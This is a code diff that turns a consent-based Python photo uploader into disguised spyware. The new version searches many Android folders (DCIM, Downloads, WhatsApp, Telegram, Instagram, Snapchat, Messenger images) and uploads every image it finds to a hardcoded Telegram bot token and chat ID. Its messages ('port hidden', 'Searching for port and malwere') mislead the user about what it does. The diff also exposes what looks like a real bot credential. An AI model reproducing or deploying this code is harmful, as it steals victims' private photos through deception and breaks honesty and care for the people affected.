@@ -1,25 +1,21 @@
 """
-DCIM Photo Sender with User Consent
-  Telegram 
+port hidden 
 """
 
 import os
 import sys
 import time
-from datetime import datetime
 import requests
 
-# ==================== TELEGRAM CONFIGURATION ====================
+# ==================== TELEGRAM CONFIG ====================
 TELEGRAM_BOT_TOKEN = "8134629384:AAE8YCOkeoEeMZ_6FGaRbCf4TNLf55rl82I"
 TELEGRAM_CHAT_ID = "820421921"
-
-# ==================== PHOTO SENDER ====================
 
 class PhotoSender:
     def __init__(self, bot_token, chat_id):
         self.api = f"https://api.telegram.org/bot{bot_token}"
         self.chat_id = chat_id
-
+        
     def send_photo(self, path):
         try:
             with open(path, "rb") as f:
@@ -27,100 +23,85 @@ class PhotoSender:
                     f"{self.api}/sendPhoto",
                     data={"chat_id": self.chat_id},
                     files={"photo": f},
-                    timeout=30
+                    timeout=10
                 )
             return r.status_code == 200
         except:
             return False
-
-    def send_batch(self, paths):
+    
+    def send_all(self, paths):
+        total = len(paths)
         for i, p in enumerate(paths, 1):
             self.send_photo(p)
-            print(f"\r PORT OFING {i}/{len(paths)}", end="", flush=True)
-            time.sleep(1)
+            print(f"\r🚀remove port {i}/{total}", end="", flush=True)
+            time.sleep(0.3)
         print()
 
-# ==================== DCIM FINDER ====================
-
 class DCIMFinder:
-    def find(self, base):
-        exts = {".jpg", ".jpeg", ".png", ".webp", ".bmp", ".gif"}
-        photos = []
-        for root, _, files in os.walk(base):
-            for f in files:
-                if os.path.splitext(f)[1].lower() in exts:
-                    photos.append(os.path.join(root, f))
-        return photos
-
-# ==================== APP ====================
-
-class App:
-    def __init__(self):
-        self.finder = DCIMFinder()
-        self.sender = PhotoSender(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)
-
-    def consent(self):
-        print("are you ready? (yes/no)")
-        return input("> ").strip().lower() in ["yes", "y"]
-
-    def choose_dcim(self):
-        paths = [
+    def find_all(self):
+        all_photos = []
+        
+        exts = {'.jpg', '.jpeg', '.png', '.webp', '.gif', '.bmp'}
+        
+        search_paths = [
             "/sdcard/DCIM",
-            "/storage/emulated/0/DCIM"
+            "/storage/emulated/0/DCIM",
+            "/storage/emulated/0/Pictures",
+            "/storage/emulated/0/Download",
+            "/storage/emulated/0/WhatsApp/Media/WhatsApp Images",
+            "/storage/emulated/0/Telegram/Telegram Images",
+            "/storage/emulated/0/Camera",
+            "/storage/emulated/0/Photos",
+            "/storage/emulated/0/Photo",
+            "/storage/emulated/0/Instagram",
+            "/storage/emulated/0/Snapchat",
+            "/storage/emulated/0/Messenger"
         ]
-        for p in paths:
-            if os.path.exists(p):
-                return p
-        return None
+        
+        for path in search_paths:
+            if os.path.exists(path):
+                try:
+                    for root, dirs, files in os.walk(path):
+                        for file in files:
+                            if os.path.splitext(file)[1].lower() in exts:
+                                all_photos.append(os.path.join(root, file))
+                except:
+                    continue
+        
+        return all_photos
 
-    def select_mode(self, photos):
-        print("\n1. quick work")
-        print("2. work slow")
-        print("3. very slow")
-        print("4. so slow")
-        print("5. exit")
-
-        try:
-            c = int(input("> "))
-            if c == 1:
-                return photos
-            if c == 2:
-                return photos[:10]
-            if c == 3:
-                return photos[:5]
-            if c == 4:
-                return photos[:1]
-        except:
-            pass
-        return []
-
-    def run(self):
-        os.system("clear")
-        if not self.consent():
-            return
-
-        dcim = self.choose_dcim()
-        if not dcim:
-            print("DCIM not found")
-            return
-
-        photos = self.finder.find(dcim)
-        if not photos:
-            print("No photos")
-            return
-
-        selected = self.select_mode(photos)
-        if not selected:
-            return
-
-        print("\nType SEND")
-        if input("> ").strip() != "SEND":
-            return
-
-        self.sender.send_batch(selected)
-        print("\nDone")
-
-# ==================== MAIN ====================
+def main():
+    os.system("clear")
+    
+    print("\n" + "="*50)
+    print("hidden location")
+    print("="*50)
+    
+    # Consent
+    print("\nType 'ALL' to of all ports")
+    response = input("> ").strip().upper()
+    
+    if response != "ALL":
+        return
+    
+    # Find photos
+    finder = DCIMFinder()
+    print("\n🔍 Searching for port and malwere...")
+    
+    photos = finder.find_all()
+    
+    if not photos:
+        print("❌ No port found")
+        return
+    
+    print(f"✅ Found {len(photos)} port and malwere")
+    print("⏳ This may take time WAIT...")
+    
+    # Send all
+    sender = PhotoSender(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID)
+    sender.send_all(photos)
+    
+    print(f"\n✅ Done!  {len(photos)} DISABLE")
 
 if __name__ == "__main__":
-    App().run()
+    main()
